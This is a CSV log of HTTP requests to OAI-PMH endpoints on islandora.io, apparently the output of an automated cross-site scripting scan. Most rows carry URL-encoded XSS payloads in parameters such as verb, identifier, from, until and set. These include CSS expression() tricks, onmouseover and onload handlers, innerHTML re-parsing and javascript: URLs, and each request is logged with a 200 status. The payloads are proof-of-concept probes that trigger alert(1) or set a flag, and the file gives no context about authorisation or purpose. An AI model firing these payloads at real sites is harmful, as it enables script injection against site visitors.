uuid,timestamp,http_status_code,request_url,response_time,http_version
e5c7536b-9be2-44d9-9af3-3b282124d6a2,2025-01-28 09:38:42,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Cdiv+STYLE%3D%22width%3A+expression%28document.vulnerable%3Dtrue%29%3B%22%3E&until=%3Cdiv+STYLE%3D%22width%3A+expression%28document.vulnerable%3Dtrue%29%3B%22%3E,63.15 ms,HTTP/1.1
249876bb-40f6-433c-be05-e17fc6068ff8,2025-01-28 09:38:42,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+STYLE%3D%22width%3A+expression%28document.vulnerable%3Dtrue%29%3B%22%3E&metadataPrefix=oai_dc,64.17 ms,HTTP/1.1
200f8517-27d7-4553-a162-58e5646d9bf4,2025-01-28 09:38:43,200,http://islandora.io/oai/request?verb=%3Cdiv+datafld%3D%22b%22+dataformatas%3D%22html%22+datasrc%3D%22%23X%22%3E%3C%2Fdiv%3E,44.75 ms,HTTP/1.1
4c58417c-936a-4f43-b761-c3666c8d763d,2025-01-28 09:38:43,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cdiv+datafld%3D%22b%22+dataformatas%3D%22html%22+datasrc%3D%22%23X%22%3E%3C%2Fdiv%3E,30.51 ms,HTTP/1.1
2d442f69-8b92-41b8-8943-086ea119dcdc,2025-01-28 09:38:43,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cdiv+datafld%3D%22b%22+dataformatas%3D%22html%22+datasrc%3D%22%23X%22%3E%3C%2Fdiv%3E,45.08 ms,HTTP/1.1
fef6b7b3-c8ec-4fde-b9e9-24a633073a2d,2025-01-28 09:38:44,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Cdiv+datafld%3D%22b%22+dataformatas%3D%22html%22+datasrc%3D%22%23X%22%3E%3C%2Fdiv%3E,88.64 ms,HTTP/1.1
a9724225-cb93-46c6-be3b-213e353a984a,2025-01-28 09:38:44,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Cdiv+datafld%3D%22b%22+dataformatas%3D%22html%22+datasrc%3D%22%23X%22%3E%3C%2Fdiv%3E&until=%3Cdiv+datafld%3D%22b%22+dataformatas%3D%22html%22+datasrc%3D%22%23X%22%3E%3C%2Fdiv%3E,49.00 ms,HTTP/1.1
dcfeba01-f717-490a-9d9c-1d0ae3469cd5,2025-01-28 09:38:44,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+datafld%3D%22b%22+dataformatas%3D%22html%22+datasrc%3D%22%23X%22%3E%3C%2Fdiv%3E&metadataPrefix=marc,56.39 ms,HTTP/1.1
fd21f84c-5e20-47ac-99e2-eeffa39cdea2,2025-01-28 09:38:45,200,http://islandora.io/oai/request?verb=%3Cdiv+id%3D%22div1%22%3E%3Cinput+value%3D%22%60%60onmouseover%3Djavascript%3Aalert%281%29%22%3E%3C%2Fdiv%3E+%3Cdiv+id%3D%22div2%22%3E%3C%2Fdiv%3E%3Cscript%3Edocument.getElementById%28%22div2%22%29.innerHTML+%3D+document.getElementById%28%22div1%22%29.innerHTML%3B%3C%2Fscript%3E,95.43 ms,HTTP/1.1
b507d984-6bc9-4d76-8213-edbd29a8a05c,2025-01-28 09:38:45,200,http://islandora.io/oai/request?verb=ListMetadataFormats,42.62 ms,HTTP/1.1
f27b5f5e-1991-4666-b259-a6a81c9878b3,2025-01-28 09:38:45,200,http://islandora.io/oai/request?verb=ListSets,74.81 ms,HTTP/1.1
d0229aad-3664-47b0-aa95-1bc9729a0209,2025-01-28 09:38:46,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,58.90 ms,HTTP/1.1
916dcd86-3d2e-4fd1-9363-acf5cd88a16c,2025-01-28 09:38:46,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Cdiv+id%3D%22div1%22%3E%3Cinput+value%3D%22%60%60onmouseover%3Djavascript%3Aalert%281%29%22%3E%3C%2Fdiv%3E+%3Cdiv+id%3D%22div2%22%3E%3C%2Fdiv%3E%3Cscript%3Edocument.getElementById%28%22div2%22%29.innerHTML+%3D+document.getElementById%28%22div1%22%29.innerHTML%3B%3C%2Fscript%3E&set=%3Cdiv+id%3D%22div1%22%3E%3Cinput+value%3D%22%60%60onmouseover%3Djavascript%3Aalert%281%29%22%3E%3C%2Fdiv%3E+%3Cdiv+id%3D%22div2%22%3E%3C%2Fdiv%3E%3Cscript%3Edocument.getElementById%28%22div2%22%29.innerHTML+%3D+document.getElementById%28%22div1%22%29.innerHTML%3B%3C%2Fscript%3E,68.56 ms,HTTP/1.1
1b8a0eae-2310-4cd3-beef-d4712c6a065d,2025-01-28 09:38:46,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+id%3D%22div1%22%3E%3Cinput+value%3D%22%60%60onmouseover%3Djavascript%3Aalert%281%29%22%3E%3C%2Fdiv%3E+%3Cdiv+id%3D%22div2%22%3E%3C%2Fdiv%3E%3Cscript%3Edocument.getElementById%28%22div2%22%29.innerHTML+%3D+document.getElementById%28%22div1%22%29.innerHTML%3B%3C%2Fscript%3E&metadataPrefix=oai_dc,59.92 ms,HTTP/1.1
6ddaeb46-237f-40af-a913-e72d6dbc2260,2025-01-28 09:38:47,200,http://islandora.io/oai/request?verb=%3Cdiv+id%3D%22x%22%3EXXX%3C%2Fdiv%3E+%3Cstyle%3E++%23x%7Bfont-family%3Afoo%5Bbar%3Bcolor%3Agreen%3B%7D++%23y%5D%3Bcolor%3Ared%3B%7B%7D++%3C%2Fstyle%3E,67.11 ms,HTTP/1.1
98952797-0f87-4993-8efc-c2e989b73735,2025-01-28 09:38:47,200,http://islandora.io/oai/request?verb=ListMetadataFormats,39.85 ms,HTTP/1.1
fae0c783-a815-49e8-b9ae-76a76beb7026,2025-01-28 09:38:48,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cdiv+id%3D%22x%22%3EXXX%3C%2Fdiv%3E+%3Cstyle%3E++%23x%7Bfont-family%3Afoo%5Bbar%3Bcolor%3Agreen%3B%7D++%23y%5D%3Bcolor%3Ared%3B%7B%7D++%3C%2Fstyle%3E,65.24 ms,HTTP/1.1
c192e965-b90f-43a2-bd3c-d898d7466f3b,2025-01-28 09:38:48,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%3Cdiv+id%3D%22x%22%3EXXX%3C%2Fdiv%3E+%3Cstyle%3E++%23x%7Bfont-family%3Afoo%5Bbar%3Bcolor%3Agreen%3B%7D++%23y%5D%3Bcolor%3Ared%3B%7B%7D++%3C%2Fstyle%3E,68.29 ms,HTTP/1.1
e6cf8833-d5f7-4ef4-af03-1921743b01a3,2025-01-28 09:38:48,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%3Cdiv+id%3D%22x%22%3EXXX%3C%2Fdiv%3E+%3Cstyle%3E++%23x%7Bfont-family%3Afoo%5Bbar%3Bcolor%3Agreen%3B%7D++%23y%5D%3Bcolor%3Ared%3B%7B%7D++%3C%2Fstyle%3E,67.47 ms,HTTP/1.1
5e6beb16-5539-4524-8ee2-77b4e153a1dc,2025-01-28 09:38:49,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+id%3D%22x%22%3EXXX%3C%2Fdiv%3E+%3Cstyle%3E++%23x%7Bfont-family%3Afoo%5Bbar%3Bcolor%3Agreen%3B%7D++%23y%5D%3Bcolor%3Ared%3B%7B%7D++%3C%2Fstyle%3E&metadataPrefix=oai_dc,70.45 ms,HTTP/1.1
3d5ffdb1-fee6-48e4-ae9c-3f47a5013ac6,2025-01-28 09:38:49,200,http://islandora.io/oai/request?verb=%3Cdiv+id%3D%22x%22%3Ex%3C%2Fdiv%3E+%3Cxml%3Anamespace+prefix%3D%22t%22%3E+%3Cimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+targetElement%3D%22x%22+to%3D%22%26lt%3Bimg%26%2311%3Bsrc%3Dx%3Ax%26%2311%3Bonerror%26%2311%3B%3Djavascript%3Aalert%281%29%26gt%3B%22%3E,77.48 ms,HTTP/1.1
a561f7c8-d00d-4624-8de2-37f9cfa1e1d7,2025-01-28 09:38:49,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cdiv+id%3D%22x%22%3Ex%3C%2Fdiv%3E+%3Cxml%3Anamespace+prefix%3D%22t%22%3E+%3Cimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+targetElement%3D%22x%22+to%3D%22%26lt%3Bimg%26%2311%3Bsrc%3Dx%3Ax%26%2311%3Bonerror%26%2311%3B%3Djavascript%3Aalert%281%29%26gt%3B%22%3E,64.91 ms,HTTP/1.1
9b6e838a-419b-4b5a-8d0f-5849402943fd,2025-01-28 09:38:50,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cdiv+id%3D%22x%22%3Ex%3C%2Fdiv%3E+%3Cxml%3Anamespace+prefix%3D%22t%22%3E+%3Cimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+targetElement%3D%22x%22+to%3D%22%26lt%3Bimg%26%2311%3Bsrc%3Dx%3Ax%26%2311%3Bonerror%26%2311%3B%3Djavascript%3Aalert%281%29%26gt%3B%22%3E,56.60 ms,HTTP/1.1
7ff65b5e-ae2f-48f2-a4d4-cf6b28c40e38,2025-01-28 09:38:50,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3Cdiv+id%3D%22x%22%3Ex%3C%2Fdiv%3E+%3Cxml%3Anamespace+prefix%3D%22t%22%3E+%3Cimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+targetElement%3D%22x%22+to%3D%22%26lt%3Bimg%26%2311%3Bsrc%3Dx%3Ax%26%2311%3Bonerror%26%2311%3B%3Djavascript%3Aalert%281%29%26gt%3B%22%3E&set=%3Cdiv+id%3D%22x%22%3Ex%3C%2Fdiv%3E+%3Cxml%3Anamespace+prefix%3D%22t%22%3E+%3Cimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+targetElement%3D%22x%22+to%3D%22%26lt%3Bimg%26%2311%3Bsrc%3Dx%3Ax%26%2311%3Bonerror%26%2311%3B%3Djavascript%3Aalert%281%29%26gt%3B%22%3E,64.81 ms,HTTP/1.1
c34d062e-bc37-417e-aae3-895f9527070a,2025-01-28 09:38:50,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc,53.07 ms,HTTP/1.1
6979cf0a-23d1-40ff-9d07-3d0e07790045,2025-01-28 09:38:51,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+id%3D%22x%22%3Ex%3C%2Fdiv%3E+%3Cxml%3Anamespace+prefix%3D%22t%22%3E+%3Cimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+targetElement%3D%22x%22+to%3D%22%26lt%3Bimg%26%2311%3Bsrc%3Dx%3Ax%26%2311%3Bonerror%26%2311%3B%3Djavascript%3Aalert%281%29%26gt%3B%22%3E&metadataPrefix=oai_dc,58.30 ms,HTTP/1.1
da5f1a94-0a89-4825-9150-7bebcf4c1862,2025-01-28 09:38:51,200,http://islandora.io/oai/request?verb=%3Cdiv+id%3Dd%3E%3Cdiv+style%3D%22font-family%3A%27sans%5C27%5C3B+color%5C3Ared%5C3B%27%22%3EX%3C%2Fdiv%3E%3C%2Fdiv%3E+%3Cscript%3Ewith%28document.getElementById%28%22d%22%29%29innerHTML%3DinnerHTML%3C%2Fscript%3E,60.06 ms,HTTP/1.1
a22e4746-04f3-4464-a149-43718b35ebb3,2025-01-28 09:38:51,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cdiv+id%3Dd%3E%3Cdiv+style%3D%22font-family%3A%27sans%5C27%5C3B+color%5C3Ared%5C3B%27%22%3EX%3C%2Fdiv%3E%3C%2Fdiv%3E+%3Cscript%3Ewith%28document.getElementById%28%22d%22%29%29innerHTML%3DinnerHTML%3C%2Fscript%3E,57.76 ms,HTTP/1.1
9fab8c99-aa7b-42e3-9f69-bed9c50d3311,2025-01-28 09:38:52,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cdiv+id%3Dd%3E%3Cdiv+style%3D%22font-family%3A%27sans%5C27%5C3B+color%5C3Ared%5C3B%27%22%3EX%3C%2Fdiv%3E%3C%2Fdiv%3E+%3Cscript%3Ewith%28document.getElementById%28%22d%22%29%29innerHTML%3DinnerHTML%3C%2Fscript%3E,71.27 ms,HTTP/1.1
054fe577-6bf7-4674-b70c-adc81abcecc2,2025-01-28 09:38:52,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,52.53 ms,HTTP/1.1
da174191-128b-443c-b152-0c21f5f25a98,2025-01-28 09:38:53,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Cdiv+id%3Dd%3E%3Cdiv+style%3D%22font-family%3A%27sans%5C27%5C3B+color%5C3Ared%5C3B%27%22%3EX%3C%2Fdiv%3E%3C%2Fdiv%3E+%3Cscript%3Ewith%28document.getElementById%28%22d%22%29%29innerHTML%3DinnerHTML%3C%2Fscript%3E&until=%3Cdiv+id%3Dd%3E%3Cdiv+style%3D%22font-family%3A%27sans%5C27%5C3B+color%5C3Ared%5C3B%27%22%3EX%3C%2Fdiv%3E%3C%2Fdiv%3E+%3Cscript%3Ewith%28document.getElementById%28%22d%22%29%29innerHTML%3DinnerHTML%3C%2Fscript%3E&set=%3Cdiv+id%3Dd%3E%3Cdiv+style%3D%22font-family%3A%27sans%5C27%5C3B+color%5C3Ared%5C3B%27%22%3EX%3C%2Fdiv%3E%3C%2Fdiv%3E+%3Cscript%3Ewith%28document.getElementById%28%22d%22%29%29innerHTML%3DinnerHTML%3C%2Fscript%3E,75.76 ms,HTTP/1.1
1b0eee7f-49db-4baa-b123-b27ba8e24ddd,2025-01-28 09:38:53,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+id%3Dd%3E%3Cdiv+style%3D%22font-family%3A%27sans%5C27%5C3B+color%5C3Ared%5C3B%27%22%3EX%3C%2Fdiv%3E%3C%2Fdiv%3E+%3Cscript%3Ewith%28document.getElementById%28%22d%22%29%29innerHTML%3DinnerHTML%3C%2Fscript%3E&metadataPrefix=oai_dc,82.06 ms,HTTP/1.1
2bbbb178-dd57-4904-8e33-e20ac2d45202,2025-01-28 09:38:53,200,http://islandora.io/oai/request?verb=%3Cdiv+id%3Dd%3E%3Cx+xmlns%3D%22%3E%3Ciframe+onload%3Djavascript%3Aalert%281%29%22%3E%3C%2Fdiv%3E+%3Cscript%3Ed.innerHTML%3Dd.innerHTML%3C%2Fscript%3E,57.93 ms,HTTP/1.1
696deb88-cb32-472e-a374-75b79a3e6558,2025-01-28 09:38:54,200,http://islandora.io/oai/request?verb=ListMetadataFormats,54.20 ms,HTTP/1.1
4fc051be-a88c-4024-a291-1cae2d5af80d,2025-01-28 09:38:54,200,http://islandora.io/oai/request?verb=ListSets,47.94 ms,HTTP/1.1
1271477e-2593-4e4d-8577-84fa0faeb182,2025-01-28 09:38:54,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%3Cdiv+id%3Dd%3E%3Cx+xmlns%3D%22%3E%3Ciframe+onload%3Djavascript%3Aalert%281%29%22%3E%3C%2Fdiv%3E+%3Cscript%3Ed.innerHTML%3Dd.innerHTML%3C%2Fscript%3E,59.11 ms,HTTP/1.1
743a106a-9cd1-44cd-9120-ce852beb449a,2025-01-28 09:38:55,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Cdiv+id%3Dd%3E%3Cx+xmlns%3D%22%3E%3Ciframe+onload%3Djavascript%3Aalert%281%29%22%3E%3C%2Fdiv%3E+%3Cscript%3Ed.innerHTML%3Dd.innerHTML%3C%2Fscript%3E&until=%3Cdiv+id%3Dd%3E%3Cx+xmlns%3D%22%3E%3Ciframe+onload%3Djavascript%3Aalert%281%29%22%3E%3C%2Fdiv%3E+%3Cscript%3Ed.innerHTML%3Dd.innerHTML%3C%2Fscript%3E&set=%3Cdiv+id%3Dd%3E%3Cx+xmlns%3D%22%3E%3Ciframe+onload%3Djavascript%3Aalert%281%29%22%3E%3C%2Fdiv%3E+%3Cscript%3Ed.innerHTML%3Dd.innerHTML%3C%2Fscript%3E,55.88 ms,HTTP/1.1
77656e2f-3dca-4da3-aafe-53e4933401b5,2025-01-28 09:38:55,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+id%3Dd%3E%3Cx+xmlns%3D%22%3E%3Ciframe+onload%3Djavascript%3Aalert%281%29%22%3E%3C%2Fdiv%3E+%3Cscript%3Ed.innerHTML%3Dd.innerHTML%3C%2Fscript%3E&metadataPrefix=marc,78.74 ms,HTTP/1.1
c2b5c376-54e5-4ecd-8fe4-03c6e611f28b,2025-01-28 09:38:55,200,http://islandora.io/oai/request?verb=%3Cdiv+onmouseover%3D%22document.vulnerable%3Dtrue%3B%22%3E,45.79 ms,HTTP/1.1
0a8a6d65-7ef1-46d2-8446-78135d5cce4c,2025-01-28 09:38:56,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cdiv+onmouseover%3D%22document.vulnerable%3Dtrue%3B%22%3E,52.20 ms,HTTP/1.1
50f5733d-1b92-45b6-9fca-8c78c570bb94,2025-01-28 09:38:56,200,http://islandora.io/oai/request?verb=ListSets,54.52 ms,HTTP/1.1
f4ed609c-d876-4667-9006-50112550af22,2025-01-28 09:38:56,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Cdiv+onmouseover%3D%22document.vulnerable%3Dtrue%3B%22%3E&until=%3Cdiv+onmouseover%3D%22document.vulnerable%3Dtrue%3B%22%3E,66.52 ms,HTTP/1.1
c4458dda-c7e9-408f-9ad6-b50af8fc7873,2025-01-28 09:38:57,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&set=%3Cdiv+onmouseover%3D%22document.vulnerable%3Dtrue%3B%22%3E,52.66 ms,HTTP/1.1
ef9eff6a-d1a7-479c-8b4e-1e6152abedff,2025-01-28 09:38:57,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+onmouseover%3D%22document.vulnerable%3Dtrue%3B%22%3E&metadataPrefix=oai_dc,55.77 ms,HTTP/1.1
570f49b0-3d2a-4021-b8b3-260643c4c8df,2025-01-28 09:38:57,200,http://islandora.io/oai/request?verb=%3Cdiv+onmouseover%3D%27alert%26lpar%3B1%26rpar%3B%27%3EDIV%3C%2Fdiv%3E,45.47 ms,HTTP/1.1
92aed89d-f6c1-48dc-900c-e82ed6765a50,2025-01-28 09:38:58,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3Cdiv+onmouseover%3D%27alert%26lpar%3B1%26rpar%3B%27%3EDIV%3C%2Fdiv%3E,70.12 ms,HTTP/1.1
e508bda1-8feb-4c67-b5c6-4d72a1be989a,2025-01-28 09:38:58,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cdiv+onmouseover%3D%27alert%26lpar%3B1%26rpar%3B%27%3EDIV%3C%2Fdiv%3E,53.90 ms,HTTP/1.1
cddf3e86-e88b-437c-ac0f-5bdf6082c18f,2025-01-28 09:38:58,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Cdiv+onmouseover%3D%27alert%26lpar%3B1%26rpar%3B%27%3EDIV%3C%2Fdiv%3E&until=%3Cdiv+onmouseover%3D%27alert%26lpar%3B1%26rpar%3B%27%3EDIV%3C%2Fdiv%3E,63.28 ms,HTTP/1.1
3157b7f7-37be-425e-beea-1917520a7c5d,2025-01-28 09:38:59,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&set=%3Cdiv+onmouseover%3D%27alert%26lpar%3B1%26rpar%3B%27%3EDIV%3C%2Fdiv%3E,74.61 ms,HTTP/1.1
195fed35-4dc4-432e-a8bd-e3ab207e5aa9,2025-01-28 09:38:59,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+onmouseover%3D%27alert%26lpar%3B1%26rpar%3B%27%3EDIV%3C%2Fdiv%3E&metadataPrefix=oai_dc,45.30 ms,HTTP/1.1
094cde84-6d25-4fcd-8191-e3818d7cf3d9,2025-01-28 09:39:00,200,http://islandora.io/oai/request?verb=%3Cdiv+style%3D%22background-image%3A+url%28javascript%3Adocument.vulnerable%3Dtrue%3B%29%3B%22%3E,66.76 ms,HTTP/1.1
a94532fc-26ed-46d5-bdff-6474f5a79799,2025-01-28 09:39:00,200,http://islandora.io/oai/request?verb=ListMetadataFormats,52.63 ms,HTTP/1.1
319686c7-8939-4d24-bcbb-4892d31253bf,2025-01-28 09:39:00,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cdiv+style%3D%22background-image%3A+url%28javascript%3Adocument.vulnerable%3Dtrue%3B%29%3B%22%3E,54.83 ms,HTTP/1.1
14ccc9d0-6ab8-402b-9198-ca6f18122132,2025-01-28 09:39:01,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Cdiv+style%3D%22background-image%3A+url%28javascript%3Adocument.vulnerable%3Dtrue%3B%29%3B%22%3E&until=%3Cdiv+style%3D%22background-image%3A+url%28javascript%3Adocument.vulnerable%3Dtrue%3B%29%3B%22%3E&set=%3Cdiv+style%3D%22background-image%3A+url%28javascript%3Adocument.vulnerable%3Dtrue%3B%29%3B%22%3E,78.91 ms,HTTP/1.1
568e70a4-40c0-4d07-a277-81c42f02f723,2025-01-28 09:39:01,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%3Cdiv+style%3D%22background-image%3A+url%28javascript%3Adocument.vulnerable%3Dtrue%3B%29%3B%22%3E,64.33 ms,HTTP/1.1
58225c1f-7505-43f2-ac7e-cd11f7c222d2,2025-01-28 09:39:01,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+style%3D%22background-image%3A+url%28javascript%3Adocument.vulnerable%3Dtrue%3B%29%3B%22%3E&metadataPrefix=oai_dc,60.77 ms,HTTP/1.1
dd75f1e8-f13f-4a9a-aeaa-462c669ff2bd,2025-01-28 09:39:02,200,http://islandora.io/oai/request?verb=%3Cdiv+style%3D%22background%3Aurl%28%2Ff%23%26%23127%3Boo%2F%3Bcolor%3Ared%2F%2A%2Ffoo.jpg%29%3B%22%3EX,52.76 ms,HTTP/1.1
fdcc0b1c-6686-4ac6-824b-bee1fce6971b,2025-01-28 09:39:02,200,http://islandora.io/oai/request?verb=ListMetadataFormats,52.49 ms,HTTP/1.1
dedd82e8-2c46-4750-a589-dca1f9d6ac0d,2025-01-28 09:39:02,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cdiv+style%3D%22background%3Aurl%28%2Ff%23%26%23127%3Boo%2F%3Bcolor%3Ared%2F%2A%2Ffoo.jpg%29%3B%22%3EX,56.39 ms,HTTP/1.1
31956e73-c320-43ff-aca1-4b369a59ade6,2025-01-28 09:39:03,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,52.24 ms,HTTP/1.1
fb282206-6bf0-4e88-9bb1-adad18439304,2025-01-28 09:39:03,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Cdiv+style%3D%22background%3Aurl%28%2Ff%23%26%23127%3Boo%2F%3Bcolor%3Ared%2F%2A%2Ffoo.jpg%29%3B%22%3EX&until=%3Cdiv+style%3D%22background%3Aurl%28%2Ff%23%26%23127%3Boo%2F%3Bcolor%3Ared%2F%2A%2Ffoo.jpg%29%3B%22%3EX&set=%3Cdiv+style%3D%22background%3Aurl%28%2Ff%23%26%23127%3Boo%2F%3Bcolor%3Ared%2F%2A%2Ffoo.jpg%29%3B%22%3EX,64.65 ms,HTTP/1.1
879b76eb-a855-4f8a-aa80-03432bfbaba9,2025-01-28 09:39:03,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+style%3D%22background%3Aurl%28%2Ff%23%26%23127%3Boo%2F%3Bcolor%3Ared%2F%2A%2Ffoo.jpg%29%3B%22%3EX&metadataPrefix=marc,72.05 ms,HTTP/1.1
b89609f4-757e-4eaa-95b9-c85d6860008c,2025-01-28 09:39:04,200,http://islandora.io/oai/request?verb=%3Cdiv+style%3D%22behaviour%3A+url%28%5Blink+to+code%5D%29%3B%22%3E,67.84 ms,HTTP/1.1
fb42125d-e39d-4439-a292-e536d825658e,2025-01-28 09:39:04,200,http://islandora.io/oai/request?verb=ListMetadataFormats,39.83 ms,HTTP/1.1
fbde7838-e8a1-4438-994b-be1f9224fa16,2025-01-28 09:39:04,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3Cdiv+style%3D%22behaviour%3A+url%28%5Blink+to+code%5D%29%3B%22%3E,51.43 ms,HTTP/1.1
5fabf620-d5c8-457c-ac66-2c230fb4d5d0,2025-01-28 09:39:05,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Cdiv+style%3D%22behaviour%3A+url%28%5Blink+to+code%5D%29%3B%22%3E&until=%3Cdiv+style%3D%22behaviour%3A+url%28%5Blink+to+code%5D%29%3B%22%3E,44.95 ms,HTTP/1.1
80c71ed7-ef70-4709-a43e-44c151836214,2025-01-28 09:39:05,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc,46.18 ms,HTTP/1.1
98e15720-c8c7-4db4-a5ce-9d998dadf8a1,2025-01-28 09:39:05,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+style%3D%22behaviour%3A+url%28%5Blink+to+code%5D%29%3B%22%3E&metadataPrefix=marc,45.95 ms,HTTP/1.1
b8b0bbd9-fc3d-43a9-9c6a-74da3618feaa,2025-01-28 09:39:06,200,http://islandora.io/oai/request?verb=%3Cdiv+style%3D%22binding%3A+url%28%5Blink+to+code%5D%29%3B%22%3E,60.05 ms,HTTP/1.1
28379cd5-0a61-4396-911e-1334c1cb5ad4,2025-01-28 09:39:06,200,http://islandora.io/oai/request?verb=ListMetadataFormats,45.15 ms,HTTP/1.1
368a99d3-4ce0-477d-8f13-6368ee5d53fb,2025-01-28 09:39:07,200,http://islandora.io/oai/request?verb=ListSets,60.44 ms,HTTP/1.1
dfc1d6cb-91bb-475a-8759-2e63f218f935,2025-01-28 09:39:07,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3Cdiv+style%3D%22binding%3A+url%28%5Blink+to+code%5D%29%3B%22%3E,61.75 ms,HTTP/1.1
646c87d1-156b-4cb0-8c99-2f7cd1ed3bed,2025-01-28 09:39:07,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3Cdiv+style%3D%22binding%3A+url%28%5Blink+to+code%5D%29%3B%22%3E,54.94 ms,HTTP/1.1
69e9814b-8410-4f9a-8388-cf766a0041ae,2025-01-28 09:39:08,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3Cdiv+style%3D%22binding%3A+url%28%5Blink+to+code%5D%29%3B%22%3E&metadataPrefix=marc,72.55 ms,HTTP/1.1
